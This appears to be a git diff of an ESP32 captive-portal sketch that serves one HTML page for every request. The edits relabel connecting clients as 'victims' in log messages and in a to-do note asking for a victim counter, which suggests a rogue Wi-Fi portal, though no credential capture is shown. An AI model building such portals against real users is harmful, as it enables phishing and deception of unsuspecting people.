@@ -1,11 +1,9 @@
 /*
   To Do 
-  client status handling function "client connected, disconnected etc"
+  client status handling function "client connected, disconnected etc" done but now i want a counter for victims
   https://github.com/CDFER/Captive-Portal-ESP32/blob/main/src/main.cpp   has quite the information and knowledge, learn from him
   device list that this actually works on currently windows11 is a yes  
-  redbull/whitemonster
-  
-  
+    
   */
  
 #include <DNSServer.h>
@@ -65,10 +63,12 @@ public:
 void setupServer(){
   server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
       request->send_P(200, "text/html", index_html); 
-      Serial.println("Client Connected"); 
+      Serial.println("Victim Connected"); 
   });
   server.onNotFound([](AsyncWebServerRequest *request){
     request->send_P(200, "text/html", index_html);
+    Serial.println("Victim Connected");
+    
   });
 }
 
